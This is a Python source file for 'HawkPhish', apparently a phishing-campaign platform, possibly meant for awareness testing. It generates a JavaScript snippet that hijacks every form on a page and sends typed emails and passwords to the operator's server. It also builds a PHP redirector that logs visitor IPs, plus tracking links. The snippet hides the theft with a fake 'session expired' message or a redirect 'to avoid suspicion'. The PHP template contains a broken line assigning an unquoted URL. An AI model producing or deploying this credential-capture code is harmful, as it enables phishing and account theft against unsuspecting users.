"""HawkPhish - External Integration SDK Service"""
import json
from typing import Dict, List


def generate_js_sdk(base_url: str, campaign_id: int = None, landing_page_id: int = None, 
                   capture_fields: List[str] = None, redirect_url: str = None,
                   track_opens: bool = True, track_clicks: bool = True) -> str:
    """Generate a drop-in JavaScript SDK for external landing pages.
    
    This creates a small, self-contained JS snippet that can be pasted into any HTML page.
    It handles tracking, form interception, and data submission to HawkPhish.
    """
    
    capture_fields = capture_fields or ["email", "password"]
    
    sdk = f"""<!-- HawkPhish External Integration SDK -->
<script>
(function() {{
    'use strict';
    
    // Configuration
    var CONFIG = {{
        baseUrl: '{base_url}',
        campaignId: {campaign_id or 'null'},
        landingPageId: {landing_page_id or 'null'},
        captureFields: {json.dumps(capture_fields)},
        redirectUrl: {json.dumps(redirect_url) or 'null'},
        trackOpens: {str(track_opens).lower()},
        trackClicks: {str(track_clicks).lower()}
    }};
    
    // Extract tracking ID from URL
    function getTrackingId() {{
        var urlParams = new URLSearchParams(window.location.search);
        var tid = urlParams.get('tracking_id') || urlParams.get('tid') || urlParams.get('t');
        if (!tid) {{
            // Try hash
            var hash = window.location.hash.replace('#', '');
            if (hash && hash.length > 5) tid = hash;
        }}
        return tid || 'unknown';
    }}
    
    var trackingId = getTrackingId();
    
    // Send beacon to HawkPhish
    function sendBeacon(data) {{
        var url = CONFIG.baseUrl + '/api/external/track';
        var payload = JSON.stringify(Object.assign({{ tracking_id: trackingId }}, data));
        
        if (navigator.sendBeacon) {{
            navigator.sendBeacon(url, new Blob([payload], {{ type: 'application/json' }}));
        }} else {{
            fetch(url, {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: payload,
                mode: 'cors',
                keepalive: true
            }}).catch(function(e) {{ console.log('HawkPhish track error:', e); }});
        }}
    }}
    
    // Track page open
    if (CONFIG.trackOpens) {{
        sendBeacon({{
            event: 'open',
            url: window.location.href,
            referrer: document.referrer,
            user_agent: navigator.userAgent,
            campaign_id: CONFIG.campaignId,
            landing_page_id: CONFIG.landingPageId
        }});
    }}
    
    // Track clicks on links
    if (CONFIG.trackClicks) {{
        document.addEventListener('click', function(e) {{
            var target = e.target.closest('a');
            if (target && target.href) {{
                sendBeacon({{
                    event: 'click',
                    url: target.href,
                    campaign_id: CONFIG.campaignId,
                    landing_page_id: CONFIG.landingPageId
                }});
            }}
        }});
    }}
    
    // Intercept all form submissions
    function interceptForms() {{
        var forms = document.querySelectorAll('form');
        forms.forEach(function(form) {{
            form.addEventListener('submit', function(e) {{
                e.preventDefault();
                
                var formData = new FormData(form);
                var data = {{}};
                formData.forEach(function(value, key) {{
                    data[key] = value;
                }});
                
                // Send captured data
                var captureUrl = CONFIG.baseUrl + '/api/external/submit';
                var payload = {{
                    tracking_id: trackingId,
                    campaign_id: CONFIG.campaignId,
                    landing_page_id: CONFIG.landingPageId,
                    data: data,
                    url: window.location.href,
                    user_agent: navigator.userAgent
                }};
                
                fetch(captureUrl, {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify(payload),
                    mode: 'cors'
                }}).then(function(response) {{
                    if (response.ok) {{
                        // Redirect after capture
                        if (CONFIG.redirectUrl) {{
                            window.location.href = CONFIG.redirectUrl;
                        }} else {{
                            // Show generic message
                            document.body.innerHTML = '<div style="text-align:center;padding:50px;font-family:sans-serif"><h2>Thank you</h2><p>Your session has expired. Please sign in again.</p></div>';
                        }}
                    }}
                }}).catch(function(err) {{
                    console.log('HawkPhish submit error:', err);
                    // Still redirect to avoid suspicion
                    if (CONFIG.redirectUrl) {{
                        window.location.href = CONFIG.redirectUrl;
                    }}
                }});
            }});
        }});
    }}
    
    // Run on DOM ready
    if (document.readyState === 'loading') {{
        document.addEventListener('DOMContentLoaded', interceptForms);
    }} else {{
        interceptForms();
    }}
    
    // Also watch for dynamically added forms
    var observer = new MutationObserver(function(mutations) {{
        mutations.forEach(function(mutation) {{
            if (mutation.addedNodes.length) {{
                interceptForms();
            }}
        }});
    }});
    observer.observe(document.body, {{ childList: true, subtree: true }});
    
    console.log('HawkPhish SDK loaded. Tracking ID:', trackingId);
}})();
</script>
<!-- End HawkPhish SDK -->"""
    
    return sdk


def generate_php_redirector(base_url: str, tracking_id: str = "##tracking_id##") -> str:
    """Generate a PHP redirector that can be used on external hosting."""
    return f"""<?php
// HawkPhish PHP Redirector
// Place this file on your external hosting and link to it

$tracking_id = $_GET['tracking_id'] ?? $_GET['tid'] ?? 'unknown';
$campaign_id = {base_url};

// Track click
$ch = curl_init('{base_url}/api/external/track');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
    'tracking_id' => $tracking_id,
    'event' => 'click',
    'url' => $_SERVER['REQUEST_URI'],
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
    'ip' => $_SERVER['REMOTE_ADDR'] ?? ''
]));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// Redirect to actual landing page
header("Location: {base_url}/lp/##landing_page_id##?tracking_id=" . urlencode($tracking_id));
exit;
?>"""


def generate_tracking_link(base_url: str, tracking_id: str, landing_page_id: int = None, 
                           external_url: str = None) -> str:
    """Generate a tracking link that can be used in emails."""
    if external_url:
        return f"{external_url}?tracking_id={tracking_id}"
    if landing_page_id:
        return f"{base_url}/lp/{landing_page_id}?tracking_id={tracking_id}"
    return f"{base_url}/track/{tracking_id}"
